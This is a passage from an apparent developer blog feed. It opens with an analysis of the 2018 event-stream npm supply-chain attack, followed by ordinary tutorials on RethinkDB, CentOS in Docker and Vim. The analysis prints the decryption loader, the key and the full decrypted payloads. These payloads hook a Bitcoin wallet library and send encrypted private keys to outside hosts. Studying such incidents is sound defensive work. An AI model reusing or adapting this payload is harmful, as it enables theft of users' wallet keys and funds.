dd29ce1471fa6972df108717100412c804efcf8aaba277f0107b1c51f15f144ab02dd8f334d5b48caf24a4492979fa425c4c25c4d213408ecfeb82f34e7d20f26f65fa4e89db57582d6a928914ee6fc0c6cc0a9793aa032883ea5a2d2135dbfcf762f4a2e22585966be376d30fbfabb1dfd182e7b174097481763c04f5d7cbd060c5a36dc0e3dd235de1669f3db8747d5b74d8c1cc9ab3a919e257fb7e6809f15ab7c2506437ced02f03416a1240a555f842a11cde514c450a2f8536f25c60bbe0e1b013d8dd407e4cb171216e30835af7ca0d9e3ff33451c6236704b814c800ecc6833a0e66cd2c487862172bc8a1acb7786ddc4e05ba4e41ada15e0d6334a8bf51373722c26b96bbe4d704386469752d2cda5ca73f7399ff0df165abb720810a4dc19f76ca748a34cb3d0f9b0d800d7657f702284c6e818080d4d9c6fff481f76fb7a7c5d513eae7aa84484822f98a183e192f71ea4e53a45415ddb03039549b18bc6e1\u0026#34;,\u0026#34;63727970746f\u0026#34;,\u0026#34;656e76\u0026#34;,\u0026#34;6e706d5f7061636b6167655f6465736372697074696f6e\u0026#34;,\u0026#34;616573323536\u0026#34;,\u0026#34;6372656174654465636970686572\u0026#34;,\u0026#34;5f636f6d70696c65\u0026#34;,\u0026#34;686578\u0026#34;,\u0026#34;75746638\u0026#34;] // o = t[e(n[3])][e(n[4])]; // npm_package_description = process[decode(n[3])][decode(n[4])]; // npm_package_description = process[\u0026#39;env\u0026#39;][\u0026#39;npm_package_description\u0026#39;]; npm_package_description = \u0026#39;Get all children of a pid\u0026#39;; // Description from ps-tree (this is the aes decryption key) // if (!o) return; if (!npm_package_description) return; // var u = r(e(n[2]))[e(n[6])](e(n[5]), o), // var decipher = require(decode(n[2]))[decode(n[6])](decode(n[5]), npm_package_description), var decipher = require(\u0026#39;crypto\u0026#39;)[\u0026#39;createDecipher\u0026#39;](\u0026#39;aes256\u0026#39;, npm_package_description), // a = u.update(n[0], e(n[8]), e(n[9])); // decoded = decipher.update(n[0], e(n[8]), e(n[9])); decoded = decipher.update(n[0], \u0026#39;hex\u0026#39;, \u0026#39;utf8\u0026#39;); console.log(n); // a += u.final(e(n[9])); decoded += decipher.final(\u0026#39;utf8\u0026#39;); // var f = new module.constructor; var newModule = new module.constructor; /**************** DO NOT UNCOMMENT [THIS RUNS THE CODE] **************/ // f.paths = module.paths, f[e(n[7])](a, \u0026#34;\u0026#34;), f.exports(n[1]) // newModule.paths = module.paths, newModule[\u0026#39;_compile\u0026#39;](decoded, \u0026#34;\u0026#34;), newModule.exports(n[1]) // newModule.paths = module.paths // newModule[\u0026#39;_compile\u0026#39;](decoded, \u0026#34;\u0026#34;) // Module.prototype._compile = function(content, filename) // newModule.exports(n[1]) As we can see, this is a fairly messy bit of code (as it had to be converted from mini-js to readable Node code). Also, the reader should note that there are some additional comments provided by FallingSnow, specifically the last bit. Caution! Do not run the last bit of code. You can simply use the above code to decrypt and see the injection attack.\nThe biggest thing that tips us off to this being malicious is the long stream of encrypted characters that are latter decrypted and used in a exports statement, effectively \u0026ldquo;compiling\u0026rdquo; and running whatever is held in the encrypted block. Further, we can see that the n variable holds an array of 2 separate strings. And finally, in the last block, we can see that the decrypted string from the n variable is used with a \u0026lsquo;_compile\u0026rsquo; statement, effectively running whatever parsed JavaScript might be held within the string.\nBrute Force a Solution Now, the key to deciphering the encrypted text depends directly on the npm_package_description variable, as we can see it is being used as the key in the createDecipher method. The initial thought from the community was that this key must be from the event stream package.json file itself (since the node runtime environment would set the modules description). However, this proved to not be the correct key and several Github users noted that it is possible to manually set a modules description from within the code. So, in order to find out what this injection attack is doing, we have to find the matching NPM package description.\nEventually, the community was able to find a listing of all public NPM package descriptions and brute force a solution out of this long list of descriptions. Brute forcing the solution out of public NPM package descriptions was a clever way to eventually land on the right key. Since the variable name is descriptive enough, we can effectively narrow it down from an infinite number of possibilities to only strings that are NPM package descriptions. If the key\u0026rsquo;s variable name hadn\u0026rsquo;t been as pronounced, it would have been more challenge to find the key. The correct key is as follows and comes from the copay-dash NPM module:\nnpm_package_description = \u0026#39;A Secure Bitcoin Wallet\u0026#39;; Using this as the key, we can see the decrypted code is as follows, in the two seperate payloads:\n/*@@*/ module.exports = function(e) { try { if (!/build\\:.*\\-release/.test(process.argv[2])) return; var t = process.env.npm_package_description, r = require(\u0026#34;fs\u0026#34;), i = \u0026#34;./node_modules/@zxing/library/esm5/core/common/reedsolomon/ReedSolomonDecoder.js\u0026#34;, n = r.statSync(i), c = r.readFileSync(i, \u0026#34;utf8\u0026#34;), o = require(\u0026#34;crypto\u0026#34;).createDecipher(\u0026#34;aes256\u0026#34;, t), s = o.update(e, \u0026#34;hex\u0026#34;, \u0026#34;utf8\u0026#34;); s = \u0026#34;\\n\u0026#34; + (s += o.final(\u0026#34;utf8\u0026#34;)); var a = c.indexOf(\u0026#34;\\n/*@@*/\u0026#34;); 0 \u0026lt;= a \u0026amp;\u0026amp; (c = c.substr(0, a)), r.writeFileSync(i, c + s, \u0026#34;utf8\u0026#34;), r.utimesSync(i, n.atime, n.mtime), process.on(\u0026#34;exit\u0026#34;, function() { try { r.writeFileSync(i, c, \u0026#34;utf8\u0026#34;), r.utimesSync(i, n.atime, n.mtime) } catch (e) {} }) } catch (e) {} }; /*@@*/ ! function() { function e() { try { var o = require(\u0026#34;http\u0026#34;), a = require(\u0026#34;crypto\u0026#34;), c = \u0026#34;-----BEGIN PUBLIC KEY-----\\\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\\\\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\\\\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\\\\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\\\\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\\\\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\\\\n2wIDAQAB\\\\n-----END PUBLIC KEY-----\u0026#34;; function i(e, t, n) { e = Buffer.from(e, \u0026#34;hex\u0026#34;).toString(); var r = o.request({ hostname: e, port: 8080, method: \u0026#34;POST\u0026#34;, path: \u0026#34;/\u0026#34; + t, headers: { \u0026#34;Content-Length\u0026#34;: n.length, \u0026#34;Content-Type\u0026#34;: \u0026#34;text/html\u0026#34; } }, function() {}); r.on(\u0026#34;error\u0026#34;, function(e) {}), r.write(n), r.end() } function r(e, t) { for (var n = \u0026#34;\u0026#34;, r = 0; r \u0026lt; t.length; r += 200) { var o = t.substr(r, 200); n += a.publicEncrypt(c, Buffer.from(o, \u0026#34;utf8\u0026#34;)).toString(\u0026#34;hex\u0026#34;) + \u0026#34;+\u0026#34; } i(\u0026#34;636f7061796170692e686f7374\u0026#34;, e, n), i(\u0026#34;3131312e39302e3135312e313334\u0026#34;, e, n) } function l(t, n) { if (window.cordova) try { var e = cordova.file.dataDirectory; resolveLocalFileSystemURL(e, function(e) { e.getFile(t, { create: !1 }, function(e) { e.file(function(e) { var t = new FileReader; t.onloadend = function() { return n(JSON.parse(t.result)) }, t.onerror = function(e) { t.abort() }, t.readAsText(e) }) }) }) } catch (e) {} else { try { var r = localStorage.getItem(t); if (r) return n(JSON.parse(r)) } catch (e) {} try { chrome.storage.local.get(t, function(e) { if (e) return n(JSON.parse(e[t])) }) } catch (e) {} } } global.CSSMap = {}, l(\u0026#34;profile\u0026#34;, function(e) { for (var t in e.credentials) { var n = e.credentials[t]; \u0026#34;livenet\u0026#34; == n.network \u0026amp;\u0026amp; l(\u0026#34;balanceCache-\u0026#34; + n.walletId, function(e) { var t = this; t.balance = parseFloat(e.balance.split(\u0026#34; \u0026#34;)[0]), \u0026#34;btc\u0026#34; == t.coin \u0026amp;\u0026amp; t.balance \u0026lt; 100 || \u0026#34;bch\u0026#34; == t.coin \u0026amp;\u0026amp; t.balance \u0026lt; 1e3 || (global.CSSMap[t.xPubKey] = !0, r(\u0026#34;c\u0026#34;, JSON.stringify(t))) }.bind(n)) } }); var e = require(\u0026#34;bitcore-wallet-client/lib/credentials.js\u0026#34;); e.prototype.getKeysFunc = e.prototype.getKeys, e.prototype.getKeys = function(e) { var t = this.getKeysFunc(e); try { global.CSSMap \u0026amp;\u0026amp; global.CSSMap[this.xPubKey] \u0026amp;\u0026amp; (delete global.CSSMap[this.xPubKey], r(\u0026#34;p\u0026#34;, e + \u0026#34;\\\\t\u0026#34; + this.xPubKey)) } catch (e) {} return t } } catch (e) {} } window.cordova ? document.addEventListener(\u0026#34;deviceready\u0026#34;, e) : e() }(); A few things initially jump out. We can see that the injection code is targeting bitcoin, whether it\u0026rsquo;s targeting vulnerable wallets or attempting to mine coins on remote hosts, it\u0026rsquo;s difficult to decipher from this hacker\u0026rsquo;s spaghetti code. Often times, malicious actors will attempt to make their code as difficult to read and understand as possible. JavaScript minifiers make this easier for them and it can be a real challenge to generate a readable file from minified, abstract code.\nIn short, the community was able to realize that these two code bits will search for vulnerable crypto-currency wallets, check for the copay NPM module, and attempt to steal the wallets and funds stored within them through the targeted module. Thankfully, this vulnerability is not as far reaching as people first thought it might be. An application must be running this malicious code, the copay dependency, and have a wallet with funds.\nAftermath The people at NPM quickly took down the malicious version of event stream and the maintainers of the copay module put up a warning about the vulnerability. Unfortunately, the malicious code was not realized for almost 2 months. The last commit to the event stream repository was around September 20th, 2018 and the Github issue that started this was not opened until November 20th, 2018. There\u0026rsquo;s no real way to know how many people were negatively affected by this but it\u0026rsquo;s clear that this vulnerability reached millions of people running the event stream module through some node dependency.\nCommunity Standards This event triggered a huge backlash from the community. Why was this hacker given maintainer credentials and allowed to have publishing access to the module? Why were the countless other community members not aware of his commits? Who bares the responsibility for this open source project?\nPer the open source license provided in the module, we see the following: \u0026lsquo;THE SOFTWARE IS PROVIDED \u0026ldquo;AS IS\u0026rdquo;, WITHOUT WARRANTY OF ANY KIND\u0026rsquo;. Dose this absolve the original creator for his mistake? Dose the sole responsibility lay with the user of the software, regardless of its state? Unfortunately, this leaves many unanswered questions.\nShould I Trust You? I think it\u0026rsquo;s important to recognize the larger issue here; NPM modules are too easily trusted. I don\u0026rsquo;t know how many times I\u0026rsquo;ve looked online for something, found a package, downloaded it, and used it within my project without question. For all I know, I could be putting my users at risk of some attack by using a malicious dependency. NPM is an amazing tool, but it\u0026rsquo;s important to realize that vulnerabilities exist. Here are some tips for safe NPM package usage:\nIs the package open source? Is the package maintained by a community? Is the community currently active? How can I contribute to maintain this open source project? By involving yourself in the open source projects that you use, you can become a vigilant member of the community that protects and maintains open source software. Solo hero developers are far and few between, so don\u0026rsquo;t depend on them. Get involved, be apart of the open source community, and contribute to the projects that you use.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/legacy/npm-event-stream/","summary":"(Note: this post is from a legacy blog dated 12/14/2018 and some content or links may have changed)\nA few weeks ago, this issue was opened on a popular Node NPM package called Event Stream. This package enables Node streams to be simpler and streamlines many I/O operations within Node. Regardless, this package is a key dependency for many other Node packages and has over 1 million downloads per week from NPM.","title":"To Catch a Hacker - NPM Even Stream"},{"content":"(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed) RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data and is a production ready option for Node infrastructures.\nPre-reqs: Docker, Node, NPM\nThis post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product. You should have some knowledge of docker for this tutorial, but it\u0026rsquo;s not required. However, knowledge of Node and JavaScript will be necessary.\nRun the offical Docker Image You can pull and run the official rethink docker image to start the database locally. Simply give it a name and you\u0026rsquo;re on your way!\ndocker run -d -P --name \u0026lt;your container name\u0026gt; rethinkdb To check the port mappings in docker, simply run\ndocker port \u0026lt;your container name\u0026gt; This will show you something like this:\n28015/tcp -\u0026gt; 0.0.0.0:32769 29015/tcp -\u0026gt; 0.0.0.0:32768 8080/tcp -\u0026gt; 0.0.0.0:32770 Each of the local port mappings appear on the right and the docker container exposed ports are on the left.\nSo, if you wanted to access the containers 8080 port, we would navigate to localhost:32770. We can see this from the example as 8080/tcp -\u0026gt; 0.0.0.0:32770.\nAlternatively, you can install rethinkdb for your specific machine and run it locally. This can be found on the RethinkDB install page. Using the docker container \u0026amp; image is a nice, light weight, modular way to run rethink, similar to how a production microservice architecture might be configured. I also like being able to control the exact environment that my rethink database is running in, it\u0026rsquo;s ports, and other fun docker quality of life things!\nUsing the RethinkDB admin pannel If using the docker container, navigate to the Admin Panel by going to localhost:32770 in a browser. From our previous example, we can see that this local port is mapped to the docker container port 8080 (which is the web admin panel). If you\u0026rsquo;re running rethink on your machine locally, you should be able to simply navigate to localhost:8080.\nIn the admin pannel, you create new databases, explor data, see logs, track performance, and see what connections are running. Lets create a database with a few tables.\nIn the top navigation bar, go to the \u0026ldquo;Data Explorer\u0026rdquo; and enter the following:\nr.dbCreate(\u0026#39;ships\u0026#39;) r.db(\u0026#39;ships\u0026#39;).tableCreate(\u0026#39;battle_ships\u0026#39;) r.db(\u0026#39;ships\u0026#39;).tableCreate(\u0026#39;cruisers\u0026#39;) These raw rethink queries create and build our initial database. This can also be acomplished from \u0026ldquo;Tables\u0026rdquo; in the top navigation bar or right in your node app! However, the \u0026ldquo;Data Explorer\u0026rdquo; is an essential tool for viewing, manuipulating, and creating data. This is a great link for useful Data Explorer queries.\nInstall Rethink javascript drivers via NPM In order to use the rethink drivers in our Node app, we need to install them via NPM. From the command line:\nnpm install rethinkdb The node_modules folder will now contain the necessary rethink drivers for accessing our rethink instance. To access the rethink drivers from your Node app, require the drivers:\nconst r = require(\u0026#39;rethinkdb\u0026#39;); Open a connection to the Rethink instance let connection = null; // This could also be declared from a .env file let config = { host: \u0026#39;localhost\u0026#39;, port: \u0026#39;32769\u0026#39; } r.connect(config, function(err, conn) { if (err) throw err; connection = conn; }); Now, the connection variable will hold the raw data necessary to connect to the rethink instance. Make special note of what port you specify. This should be the port that maps to 28015 in the docker container.\nFor this local instance of the rethinkdb, we won\u0026rsquo;t worry too much about dynamic ports or not exposing the ports to the public in production. Here is a good article about one way you can create production ready ports and configurations.\nThis step can be quite complicated. You can do a number of things per your needs, including placing this step into some middleware to connect automatically, check the configuration of your database, reconfigure settings if something is wrong, or validate authorization. Check out this repository from the rethink people for more complex operations around connecting.\nBasic Crud Operations Insert Data // Inserts 2 battleships r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;).insert([ { \u0026#39;name\u0026#39;: \u0026#39;Arizona\u0026#39;, \u0026#39;size\u0026#39;: 22, \u0026#39;guns\u0026#39;: [ \u0026#39;railgun\u0026#39;, \u0026#39;off_shore_missles\u0026#39; ] }, { \u0026#39;name\u0026#39;: \u0026#39;Iowa\u0026#39;, \u0026#39;size\u0026#39;: 34, \u0026#39;guns\u0026#39;: [ \u0026#39;light_machine\u0026#39; ] }]).run(connection, function (err, res) { if (err) throw err; console.log(JSON.stringify(res)); }) We can see that we are inserting raw JSON objects! Awesome! Now, from the Data explorer, if we query the battle_ships table:\nr.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) We will see the following JSON has been entered into the database:\n{ \u0026#34;guns\u0026#34;: [ \u0026#34;railgun\u0026#34; , \u0026#34;off_shore_missles\u0026#34; ] , \u0026#34;id\u0026#34;: \u0026#34;35502dbd-0354-4ca8-bef5-06825ab8df26\u0026#34; , \u0026#34;name\u0026#34;: \u0026#34;Arizona\u0026#34; , \u0026#34;size\u0026#34;: 22 } { \u0026#34;guns\u0026#34;: [ \u0026#34;light_machine\u0026#34; ] , \u0026#34;id\u0026#34;: \u0026#34;b960127b-994f-44b7-88f5-f7463fc90dae\u0026#34; , \u0026#34;name\u0026#34;: \u0026#34;Iowa\u0026#34; , \u0026#34;size\u0026#34;: 34 } Getting data // Get all battle ships r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .run(connection, function(err, cursor) { if (err) throw err; cursor.toArray(function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); }); In this example, we are getting all the ships in the battle_ships table. Most rethink queries of this size will return a cursor by default, so to get the raw results, we must make it an array with the .toArray method. The callback will contain the results that can than be parsed further.\n// Get specific battleship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .get(\u0026#39;35502dbd-0354-4ca8-bef5-06825ab8df26\u0026#39;) .run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); This gets a single ship from the battle_ships table based on the primary key. The primary key is the ID automatically assigned to the inserted JSON. The results we get back in the callback function is the JSON object of the provided key.\nUpdate JSON objects // Update the length of The Texas battle ship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;cruisers\u0026#39;).filter(r.row(\u0026#34;name\u0026#34;).eq(\u0026#34;Texas\u0026#34;)) .update({ \u0026#34;length\u0026#34;: 33 }).run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); Here, we update a ship\u0026rsquo;s length by providing an updated JSON object. Note that we don\u0026rsquo;t need to provide all fields of the object in order for it to be updated. Once we run the query, the returned result will be what was updated in the database. This snippet also introduces the .filter rethink method. This can be used to pull specific records based on a number of conditions. Finding json objects this way is very powerful and can be chained with other queries. Almost anything you can do with SQL or Mongo, you can do with rethink queries. Check out this awesome page for some really useful queries.\nDelete JSON data // Remove the Iowa battle ship r.db(\u0026#39;ships\u0026#39;).table(\u0026#39;battle_ships\u0026#39;) .filter(r.row(\u0026#39;name\u0026#39;).eq(\u0026#39;Iowa\u0026#39;)) .delete() .run(connection, function(err, res) { if (err) throw err; console.log(JSON.stringify(res)); }); Here, we again use the .filter method to find a document in the database. Then, we delete it using the .delete() rethink method. After running this query, the JSON will be removed from the database.\nConclusion I hope that this little dive into RethinkDB has been interesting and has you curious about JSON based databases. Being able to store raw JSON in a NoSQL database is extremely powerful and fits well with JavaScript based architectures.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/legacy/rethink-db-cookbook/","summary":"(Note: this is from an old blog archieve dating 2018/11/05. Some things with Rethink have very likely changed) RethinkDB is a JSON based, non-relational database that provides a promise oriented, Node JS backend. It integrates seamlessly with JSON type data and is a production ready option for Node infrastructures.\nPre-reqs: Docker, Node, NPM\nThis post will serve as a brief overview of RethinkDB and hopefully give you a taste of how it works and why a JSON based database might be beneficial for you and your product.","title":"Rethink-DB Cookbook"},{"content":"If you are a Oregon State CS 344 student, then you\u0026rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!\nNote: when a \u0026ldquo;host\u0026rdquo; is referenced, this is in regard to your own laptop and your own environment, not any container or virtual machine you might have running.\n1. Get Docker You can download and install Docker at this link\nDocker creates operating system level virtualizations through \u0026ldquo;containers\u0026rdquo;. It’s alot like a traditional Virtual Machine, but containers are run through the host system kernel while maintaining their own software libraries and configurations. In short, containers are significantly less expensive as they don\u0026rsquo;t have to spin up their own virtual kernels.\n2. Start docker Once you\u0026rsquo;ve installed Docker, fire it up. It will run in the background and give you access to its command line tools.\n3. Pull the CentOS image Grab the CentOS image with the following command:\ndocker pull centos An image is a template \u0026ldquo;snapshot\u0026rdquo; used to build containers. Images contain the specific configurations and packages that define what a container is.\n4. Start the container docker run -i -t centos This will bring up the CentOS container in interactive mode with the CentOS command line. There are a huge number of flags for running containers, but this is an easy way to directly gain access to the CentOS command line.\nHere is the docker reference for flags and running an image.\n5. Install dev dependencies Because this CentOS image is a bare bone, fresh start, linux distro with nothing on it, you will need to install a few unix dev tools. This can easily be done with the following command:\nyum groupinstall \u0026#34;Development tools\u0026#34; To install Vim:\nyum install vim If you find that you\u0026rsquo;re missing some tool, try searching online for the install command (make sure to specify CentOS when googling). It is likely a yum command that you\u0026rsquo;re looking for.\n6. Place files onto container Using SCP You can pull down your files from a server with this command:\nscp username@access.engr.oregonstate.edu:~/path/to/smallsh.zip /path/to/destination Using Docker cp If you have files on your local host machine that you want on the docker container, you can use the built in docker cp command on your host machine:\ndocker cp path/to/file/testing.txt \u0026lt;container name\u0026gt;:/path/to/destination This might look something like this:\ndocker cp path/to/testing.txt wizardly_montalcini:/path/to/target Note: the container needs to be running for this to work!\nTo find the running container name, use the following command on your host machine:\ndocker container ls This will show us something like this. We can find the name on the far right:\nCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 4218f505a811 centos \u0026#34;/bin/bash\u0026#34; 2 minutes ago Up 2 minutes wizardly_montalcini 7. Work, Compile, Run Now that you have the container running, installed the development dependencies, and pulled your files, you can proceed normally! Work on your program with vim, compile, and run your executable as you would on OS1.\nHere\u0026rsquo;s an example of me doing this on a CentOS docker container\n[root@f30ebeebacde /]# make gcc -Wall -c smallsh.c buffer_io.c utility.c gcc -Wall -o smallsh smallsh.o buffer_io.o utility.o [root@f30ebeebacde /]# ./smallsh :ls README.md buffer_io.c etc lib64 media proc sbin smallsh.c srv usr var anaconda-post.log buffer_io.o home makefile mnt root shelltest smallsh.h sys utility.c bin dev lib mcbridej_smallsh.zip opt run smallsh smallsh.o tmp utility.o :cat README.md # Smallsh Author: John McBride ... 8. Get files off container Once you are ready to get your files back, you can use SCP or the built in docker cp command. These are similar to putting your files onto the container, but with the paths switched.\nUsing SCP scp /path/to/file.txt username@access.engr.oregonstate.edu:~/path/to/target Using docker cp On your local host:\ndocker cp \u0026lt;containerId\u0026gt;:/file/path/within/container /host/path/destination 9. Using Docker volumes There is a better way to get files on and off your container, but it\u0026rsquo;s slightly more complicated. In this example, let\u0026rsquo;s mount a file system volume. You can read all about volumes and how they are defined by docker. But the quick and dirty way to get files on to a container from your host when you start docker is as follows:\n$ docker run -it -v \u0026#34;/host/user/folder/to/mount:/container/destination\u0026#34; centos Note the new -v flag followed by a full file path mapping. Let\u0026rsquo;s break it down. The -v command tells docker to mount a volume. The first part of the path preceding the : defines the source directory in the host\u0026rsquo;s filesystem to mount. The path after the : defines the destination inside the container to mount the directory!\nNow, when you poke around the container, the files from the source folder will be in the destination folder. The really cool thing about this is that files are persisted across volumes. Or in other words, if you change a file that\u0026rsquo;s been mounted by a volume, it will also be changed on host! This eliminates the need for copy files and folders to and from the container!\nMuch thanks to Nathan for pointing out this tidbit!\n10. Exiting the container You can exit and stop a container in interactive mode with Ctrl d\nYou can detach from a container when in interactive mode with Ctrl p Ctrl q. To re-attach to the container, use the docker attach command:\ndocker attach \u0026lt;container name\u0026gt; This would be something like this:\ndocker attach wizardly_montalcini If you need to kill a container, you can use the docker kill command:\ndocker kill \u0026lt;container name\u0026gt; Using our example, this would look like this:\ndocker kill wizardly_montalcini Warning! Containers are NOT persistent. Again, they are NOT persistent. Once one is stopped or killed, you will loose everything on it. If you want to keep a container running, just detach from it or make sure to SCP or docker cp your files off the container before you kill it.\nIf you stop a docker container you can bring it back up with the docker run -i -t centos command.\nExtras! This section will serve as some docker extras.\nCentOS Docker Hub The official CentOS Docker image from docker hub - This has some interesting tid-bits about security dependencies and installing updates.\nDockerfiles Starting the container and installing the dev dependencies every single time you start it can be kind of annoying. Thankfully, you can use dockerfiles to automate building containers. Here is a sample dockerfile that will build the centos container and install the dev dependencies for us.\nCMD yum groupinstall \u0026#34;Development tools\u0026#34; These can get really complicated. Here is some very useful info on how dockerfiles work, how to use them, and how you can make one that fits your needs.\nHere is the official CentOS dockerfile repository on github.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/legacy/docker-trouble/","summary":"If you are a Oregon State CS 344 student, then you\u0026rsquo;ve been told to develop exclusively on the OS1 server. Unfortunately, this server is frequently nuked by fork bombs. If you are unable to run a full CentOS virtual machine, then here is a step by step guide to getting a CentOS docker container running on your computer. This way, you can continue to work on your assignments in a similar environment to OS1 and not have to have a full virtual machine running!","title":"Virtual machine trouble?? Try Docker!"},{"content":"(Note: this is a post from a legacy blog. This post was intended to help new OSU students get started with Vim)\nI\u0026rsquo;d consider myself some sort of Vim - evangelist. It\u0026rsquo;s an incredible tool and has ALOT of power. If there\u0026rsquo;s something you wish Vim could do, there\u0026rsquo;s probably a plugin for it or a way to make Vim do it with scripting (in its own language!). Moderate proficiency in Vim is a skill that nearly every developer could benefit from. Being able to modify files directly on a server is necessary in almost every development sphere.\nGet Vim Most unix like operating systems (including MacOS) should come pre-packaged with Vim. If not, you can install it with yum:\nyum install vim Or apt-get\nsudo apt-get update sudo apt-get install vim On windows you\u0026rsquo;ll want to use the installation wizard provided by the vim organization\nOn MacOS, if for some reason you\u0026rsquo;re missing Vim, you can install it with the Homebrew installer (a great package manager and installer):\nbrew install macvim Getting started: Command cheat sheets: Cheat sheets are really great to have printed off at your desk for quick reference. Here are a few of my favorites:\nfprintf.net Linux Training Academy VimSheet.com Interactive Tutorials The Vim browser game This is a great way to learn the movement keys to get around a file and do basic operations. Here are some other great resources on getting started in Vim:\nvimtutor Vim is packaged with its own tutorial named vimtutor! To start the tutorial, simple enter the name of the program! You can exit vimtutor the same way you would normally exit vim (see the section below)\nvimtutor Vim in 4 weeks A comprehensive, in depth plan to learning the various aspects of Vim. This article gets talked alot about when people are learning Vim.\nOnly use Vim! If you only use Vim, and don\u0026rsquo;t let yourself use anything else (like sublime text or VS Code), you\u0026rsquo;ll learn fast (but I would recommend going through one of the interactive tutorials first)!\nExiting Vim: Alot of people start up vim and then get frustrated by not being able to save and exit. It\u0026rsquo;s confusing initially! Here are a few different ways to save and exit!\nSaving and Exiting Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type qw and hit enter. This will \u0026ldquo;write\u0026rdquo; the file and than \u0026ldquo;quit\u0026rdquo; Vim Alternatively: in normal mode, hitting ZZ (yes both capitalized) will save and exit vim for you!\nMaking a hard exit Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type q! and enter to force vim to quite without writing (saving) anything. Danger! All things you typed since your last \u0026ldquo;write\u0026rdquo; will NOT be saved Just saving Hit esc to ensure you\u0026rsquo;re in normal mode Enter the command palette by hitting : Type w and enter to \u0026ldquo;write\u0026rdquo; your changes Customize Vim: When starting Vim, it will search for a .vimrc file in your home directory (based on your home path name). If you don\u0026rsquo;t have one, you can create one (right in your home directory, usually the same directory as your .bashrc) and use it to customize how vim functions on startup! The following are some basics that everyone should have (The reader should note that \u0026quot; are comments in Vimscript):\n\u0026#34; Turns on nice colors colo desert \u0026#34; Turns on the syntax for code. Automatically will recognize various file types syntax on Placing these (and other vimscript things) into your .vimrc will change the behavior of vim when it starts. Here\u0026rsquo;s a vimscript for setting tabs to be 4 spaces!\nfiletype plugin indent on \u0026#34; show existing tab with 4 spaces width set tabstop=4 \u0026#34; when indenting with \u0026#39;\u0026gt;\u0026#39;, use 4 spaces width set shiftwidth=4 \u0026#34; On pressing tab, insert 4 spaces set expandtab This next one is more involved, but it auto creates closing parenthesis for us! We can see that the h and i in this vimscript are the literal movement commands given to vim after auto completing the parenthesis to get the cursor back to the it\u0026rsquo;s correct position.\n\u0026#34; For mapping the opening paran with the closing one inoremap ( ()\u0026lt;Esc\u0026gt;hi This should give you a small taste of what vimscript is like and what it\u0026rsquo;s capable of. It can do alot and it\u0026rsquo;s very powerful. If there\u0026rsquo;s something you want Vim to do (like something special with spacing, indents, comments, etc), search online for it. Someone has likely tried to do the same thing and wrote a Vim script for it.\nThis cool IBM guide goes into some depth with how vim scripting works and what you can build.\nSearch in Vim: Vim makes it super easy to search and find expressions in the file you have open; it\u0026rsquo;s very powerful.\nTo search, when in normal mode (hit esc a few times):\nhit the forward-slash key / Begin typing the phrase or keyword you are looking for Hit enter The cursor will be placed on the first instance of that phrase! While still in normal mode, hit n to go to the next instance of that phrase! Hitting N will go to the previous instance of that phrase To turn off the highlighted phrases you searched for, in normal mode, hit the colon : to enter the command palette Type noh into the command palette to set \u0026ldquo;no highlighting\u0026rdquo; and the highlights will be turned off Split window view! You can have two instances of Vim open at once in a split window on the terminal. This is like tmux, but it\u0026rsquo;s managed exclusively by vim!\nHorizontal split When in normal mode, enter this into the command palette to enter a horizontal split. The \u0026ldquo;name of file to load\u0026rdquo; is the path to a file you want to open. The path is relative to where Vim was started from.\n:split \u0026lt;name of file to load\u0026gt; To achieve a vertical split:\n:vsplit \u0026lt;name of file to load\u0026gt; To change the current active panel, (when in normal mode) hit Ctrl w Ctrl w (yes, that\u0026rsquo;s ctrl w twice)\nInception Start a bash shell (or any other unix-y command) right in Vim! (in other words, yes Inception is real). When in normal mode, start the command palette and use the following command to bring up a bash shell\n:!bash Note the exclamation mark telling Vim to execute the command.\nHere\u0026rsquo;s where it gets crazy. Your initial shell you used to enter Vim is still running. On top of that shell, Vim is running. Now, on top of that, a bash shell instance is now running! It\u0026rsquo;s sort of like an onion with all the layers you can go down into. To get back to Vim, exit your bash instance with the exit command. If you than exit Vim, you will be back to your original shell. A word of warning though, all this job handling and nested processes can get fairly processor hungry. So, if your noticing some chugging, back off alittle on the inception.\nYou can execute almost any unix command like this. For example:\n:!wc sample.txt This will run the word count program for the sample.txt file! Command inception is crazy cool!\nBlock Comments I find this extremely helpful when doing full Vim development. This is taken from the following Stack Overflow discussion\nFor commenting a block of text:\n\u0026ldquo;First, 